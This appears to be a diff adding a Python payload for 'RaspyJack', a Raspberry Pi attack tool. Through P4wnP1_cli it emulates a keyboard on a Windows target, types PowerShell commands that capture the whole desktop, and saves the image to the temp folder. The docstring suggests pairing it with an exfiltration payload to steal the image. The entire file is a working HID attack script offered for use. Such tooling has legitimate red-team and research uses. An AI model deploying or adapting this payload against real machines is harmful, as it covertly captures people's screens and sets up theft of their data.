@@ -1,0 +1,93 @@
+#!/usr/bin/env python3
+"""
+RaspyJack *payload* – **HID Attack: Take Screenshot (Windows)**
+=================================================================
+A HID attack that uses PowerShell to take a screenshot of the current
+desktop and save it to the temp directory.
+
+This could be combined with an exfiltration payload to steal the image.
+"""
+
+import os, sys, subprocess, time
+sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+import RPi.GPIO as GPIO
+import LCD_1in44, LCD_Config
+from PIL import Image, ImageDraw, ImageFont
+
+# --- Display Functions ---
+def show_message(lines, color="lime"):
+    LCD = LCD_1in44.LCD()
+    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
+    image = Image.new("RGB", (128, 128), "BLACK")
+    draw = ImageDraw.Draw(image)
+    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
+    y = 40
+    for line in lines:
+        draw.text((10, y), line, font=font, fill=color)
+        y += 15
+    LCD.LCD_ShowImage(image, 0, 0)
+
+# --- Main Attack Logic ---
+def run_attack():
+    show_message(["HID Attack:", "Screenshot"])
+    
+    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
+        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
+        return
+
+    # PowerShell commands to take a screenshot
+    cmd1 = "Add-Type -AssemblyName System.Windows.Forms"
+    cmd2 = "$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen"
+    cmd3 = "$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height"
+    cmd4 = "$graphics = [System.Drawing.Graphics]::FromImage($bitmap)"
+    cmd5 = "$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)"
+    cmd6 = "$bitmap.Save('$env:TEMP\\screenshot.png')"
+    
+    script = f"""
+GUI r
+delay(500)
+type("powershell")
+delay(200)
+press("ENTER")
+delay(750)
+type("{cmd1}")
+press("ENTER")
+delay(200)
+type("{cmd2}")
+press("ENTER")
+delay(200)
+type("{cmd3}")
+press("ENTER")
+delay(200)
+type("{cmd4}")
+press("ENTER")
+delay(200)
+type("{cmd5}")
+press("ENTER")
+delay(200)
+type("{cmd6}")
+press("ENTER")
+delay(500)
+type("exit")
+press("ENTER")
+"""
+    
+    cli_command = f"P4wnP1_cli hid job -c '{script}'"
+    
+    try:
+        subprocess.run(cli_command, shell=True, check=True, timeout=45)
+        show_message(["Attack Sent!", "Screenshot saved", "in %TEMP%"])
+    except Exception as e:
+        show_message(["Attack FAILED!"])
+        print(f"Error running HID attack: {e}", file=sys.stderr)
+
+# --- Execution ---
+if __name__ == '__main__':
+    try:
+        run_attack()
+        time.sleep(3)
+    finally:
+        LCD = LCD_1in44.LCD()
+        LCD.LCD_Clear()
+        GPIO.cleanup()
+        print("HID Attack payload finished.")
